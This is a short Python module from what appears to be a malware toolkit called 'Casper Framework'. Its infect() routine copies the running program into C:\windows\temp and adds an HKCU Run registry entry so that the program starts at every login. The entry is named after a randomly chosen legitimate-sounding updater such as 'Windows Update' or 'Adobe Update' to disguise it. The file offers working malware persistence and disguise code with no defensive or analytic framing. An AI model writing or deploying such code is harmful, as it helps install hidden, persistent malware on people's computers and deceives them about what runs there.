"""
Part of Casper Framework
"""
from includes import *

value_names = ["Adobe Update","Microsoft Update","Windows Update","OneDrive Update","Acrobat Reader Plugin","Outlook Plugin","Microsoft Office Update","Google Chrome Update"]

def registry():
	try:
		key = r"Software\Microsoft\Windows\CurrentVersion\Run"
		open = OpenKey(HKEY_CURRENT_USER,key,0,KEY_ALL_ACCESS)
		SetValueEx(open,random.choice(value_names),0,REG_SZ,"c:\\windows\\temp\\"+sys.argv[0])
		return True
	except Exception as e:
		return False

def drop():
	try:
		shutil.copyfile(os.path.join(os.getcwd(),sys.argv[0]),"c:\\windows\\temp\\"+sys.argv[0])
		return True
	except Exception as e:
		return False

def infect():
	logging.debug("[casper] Attempting to add registry key under >> Software\Microsoft\Windows\CurrentVersion\Run")
	if (registry() == True):
		logging.debug("[casper] Registry key was successfully created")

		logging.debug("[casper] Dropping the file in temp directory")
		if (drop() == True):
			logging.debug("[casper] Finished registry infection")
			return True
		else:
			logging.debug("[casper] Error while dropping file at temp directory")
	else:
		logging.debug("[casper] Error while adding registry key")
